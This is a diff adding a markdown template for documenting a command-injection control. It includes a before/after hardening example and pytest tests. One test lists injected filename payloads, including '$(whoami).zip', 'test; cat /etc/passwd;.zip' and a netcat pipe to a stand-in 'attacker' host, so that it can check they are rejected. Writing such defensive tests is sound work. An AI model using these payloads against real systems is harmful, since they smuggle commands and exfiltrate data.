@@ -1,0 +1,130 @@
+# Control: [Control ID]
+
+**ID:** `C-###`
+**Category:** [Execution | Parser | IO | AuthZ | Network]
+**Status:** `Proposed | In Progress | Deployed`
+**Date Created:** [YYYY-MM-DD]
+
+---
+
+## Summary
+
+One sentence: What class of vulnerability does this control prevent?
+
+> [e.g., "Prevents command injection by ensuring all shell execution uses argv array instead of string concatenation"]
+
+---
+
+## Applies To
+
+List vulnerabilities (hypothesis IDs) that this control addresses:
+- `hyp_001` — Shell injection via filename
+- `hyp_005` — Config injection leading to RCE
+- etc.
+
+---
+
+## Implementation
+
+### Code Changes
+
+Exact code change or pattern:
+
+```python
+# BEFORE (vulnerable):
+system("unzip -d /tmp " + filename)
+
+# AFTER (hardened with control):
+safe_exec(["unzip", "-d", "/tmp", filename])
+```
+
+### Files to Modify
+
+- `src/exec.c:45` — Create safe_exec() wrapper
+- `src/upload.c:123` — Replace system() call
+- etc.
+
+### Dependencies
+
+- Requires: [other controls, libraries, OS features]
+- Compatible with: [existing code, frameworks]
+
+---
+
+## Testing
+
+### Regression Test
+
+How do we verify this control stays in place?
+
+```python
+def test_no_shell_injection_in_unzip():
+    # Attempt to inject shell metacharacters
+    payload = '`id`.zip'
+
+    # Should NOT execute id command
+    result = safe_extract(payload)
+
+    # Verify command did not execute
+    assert "uid=" not in result
+```
+
+### Exploit Prevention Test
+
+```python
+def test_shell_metacharacters_blocked():
+    dangerous_inputs = [
+        '`id`.zip',
+        '$(whoami).zip',
+        'test; cat /etc/passwd;.zip',
+        'test | nc attacker 4444 |.zip',
+    ]
+
+    for payload in dangerous_inputs:
+        try:
+            safe_extract(payload)
+            assert False, f"Should have blocked: {payload}"
+        except ValueError:
+            pass  # Expected
+```
+
+---
+
+## Deployment
+
+### Steps
+
+1. [ ] Write tests (regression + exploit)
+2. [ ] Implement control
+3. [ ] Code review
+4. [ ] Deploy to staging
+5. [ ] Run full test suite
+6. [ ] Deploy to production
+7. [ ] Monitor logs
+
+### Rollback Plan
+
+If deployment fails:
+- [ ] [Specific rollback steps]
+
+---
+
+## References
+
+**Related Controls:**
+- [C-###] — [Related control]
+
+**CWE/CVE References:**
+- CWE-78 (OS Command Injection)
+- CWE-77 (Improper Neutralization of Special Elements)
+
+**OWASP:**
+- A03:2021 — Injection
+
+---
+
+## Notes
+
+Additional context, alternative approaches, or tradeoffs:
+
+[Notes]
